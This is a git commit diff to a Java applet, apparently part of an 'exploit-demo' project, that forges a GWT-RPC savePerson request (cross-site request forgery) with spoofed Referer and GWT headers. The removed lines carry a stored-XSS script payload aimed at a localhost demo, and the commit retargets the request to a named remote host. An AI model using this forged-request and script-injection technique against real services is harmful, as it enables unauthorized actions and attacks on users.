febb393920440a17cc49172cbb4b3b9b9577f4ad
yanosz <yanosz@gmx.net>
2011-07-29 14:33:23 +0200

    Changed URL

--- src/XsrfApplet.java
+++ src/XsrfApplet.java
@@ -12,12 +12,12 @@ public class XsrfApplet extends Applet{
 	public void init(){
 		add(outputArea);
 		try {
-			URL url = new URL("http://localhost:8080/exploit-demo/exploitdemo/person-service");
-			String data = "7|0|7|http://localhost:8080/exploit-demo/exploitdemo/|1B90092C2EC4DF33929AE5AEAD84B809|jan.edu.ed.client.services.PersonService|savePerson|jan.edu.ed.shared.model.Person/1822325774|<script type='text/javascript'>alert(1);</script>|<script type='text/javascript'>alert(1);</script>|1|2|3|4|1|5|5|6|7|";
+			URL url = new URL("http://www2.jluehr.de:8080/ed/exploitdemo/person-service");
+			String data = "7|0|7|http://www2.jluehr.de:8080/ed/exploitdemo/|B66D84EFF7710C04CCFB5CB3D2FD2E9E|jan.edu.ed.client.services.PersonService|savePerson|jan.edu.ed.shared.model.Person/3517128213|Blub|Blob|1|2|3|4|1|5|5|6|7|1|0|";
 			URLConnection conn = url.openConnection();
-			conn.setRequestProperty("X-GWT-Permutation", "EE265A9A7408B59C6DC058D094A30585");
-			conn.setRequestProperty("X-GWT-Module-Base", "http://localhost:8080/exploit-demo/exploitdemo/");
-			conn.setRequestProperty("Referer", "http://localhost:8080/exploit-demo/");
+			conn.setRequestProperty("X-GWT-Permutation", "473A6C68AD55331F387E3635F1083A49");
+			conn.setRequestProperty("X-GWT-Module-Base", "http://www2.jluehr.de:8080/ed/exploitdemo/");
+			conn.setRequestProperty("Referer", "http://www2.jluehr.de:8080/ed/");
 			conn.setRequestProperty("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:5.0.1) Gecko/20100101 Firefox/5.0.1");
 			conn.setRequestProperty("Content-Type", "text/x-gwt-rpc; charset=utf-8");
 			
